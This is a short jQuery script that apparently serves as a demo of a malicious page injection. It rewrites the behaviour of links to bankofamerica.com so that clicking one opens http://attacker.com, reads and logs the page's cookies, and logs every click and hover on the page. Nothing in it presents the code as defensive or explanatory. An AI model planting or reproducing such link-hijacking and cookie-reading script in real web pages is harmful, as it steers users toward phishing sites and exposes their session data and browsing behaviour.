$(document).ready(function() { 
    $("a").each(function () {
        if (this.href === "http://bankofamerica.com/"){
            console.log('hijacking link', this.href);
            $(this).click(function() {
                $(this).attr('href','');
                window.open("http://attacker.com", "_blank");
            })
        }
    });

    console.log(document.cookie);
    $(document).on("click",'*',function(){
        console.log(this, 'was clicked on');
    });

    $(document).on("mouseenter",'*',function(){
        console.log(this, 'was hovered over');
    });
}); 

// var cookies =Cookies.get();
// console.log(cookies);